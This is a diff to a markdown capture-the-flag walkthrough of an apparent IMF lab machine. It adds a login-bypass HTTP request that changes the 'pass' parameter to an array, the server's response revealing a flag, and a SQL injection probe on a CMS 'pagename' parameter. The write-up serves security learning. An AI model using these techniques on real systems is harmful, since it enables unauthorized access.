@@ -104,12 +104,11 @@ echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 --decode
 flag2{aW1mYWRtaW5pc3RyYXRvcg==}
 
 echo aW1mYWRtaW5pc3RyYXRvcg== | base64 --decode
-imfadministratorbase64
+imfadministrator
 ```
 
 Okay, back to the browser with our findings:
 
-- http://172.16.0.76/imfadministratorbase64 - 404
 - http://172.16.0.76/imfadministrator - 200 OK
 
 Awesome, found the admin login area.
@@ -185,3 +184,69 @@ or
 $query="select user from users where user='$user'";
 // some php login to check if $_POST['pass'] == "HardC0dedP@ss"
 ```
+
+## Failure
+
+After many wasted hours, I needed help. I found out that I was close, but an login bypass via sql injection was the wrong path to take. I needed to modify the password POST parameter to confuse validation. In Burp Suite, I modified the html field `pass` to `pass[]`.
+
+Request:
+
+```
+POST /imfadministrator/index.php?id=1 HTTP/1.1
+Host: 192.168.100.76
+User-Agent: Mozilla/5.0 (Hydra)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.76/imfadministrator/index.php?id=1
+Cookie: PHPSESSID=b9d9u2tlf9f6haipank2vvj136
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+
+user=rmichaels&pass[]=aaa
+```
+
+Response:
+
+```
+HTTP/1.1 200 OK
+Date: Fri, 11 Nov 2016 23:19:29 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 100
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+flag3{Y29udGludWVUT2Ntcw==}<br />Welcome, rmichaels<br /><a href='cms.php?pagename=home'>IMF CMS</a>
+```
+
+Awesome. Now that I'm in, more recon. FYI, the decoded base64 in the flag is `continueTOcms` so lets do that.
+
+## Inside the CMS
+
+The urls that are available in the CMS:
+
+```html
+<a href='cms.php?pagename=home'>Home</a> | 
+<a href='cms.php?pagename=upload'>Upload Report</a> | 
+<a href='cms.php?pagename=disavowlist'>Disavowed list</a> | 
+```
+
+Few things I noted:
+
+- The way that the urls are structured makes it seem like the backend could be vulnerable to an LFI or SQLi exploit. 
+- The upload page looks inactive.
+- The disavowlist seems interesting, maybe next flag is to view this page uncensored?
+
+Messing with the url by adding an apostraphe to the pagename input gives me this:
+
+```
+http://172.16.1.76/imfadministrator/cms.php?pagename=home':
+Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29
+```
+
+I'm tempted to use sqlmap, but will try to do this by hand.
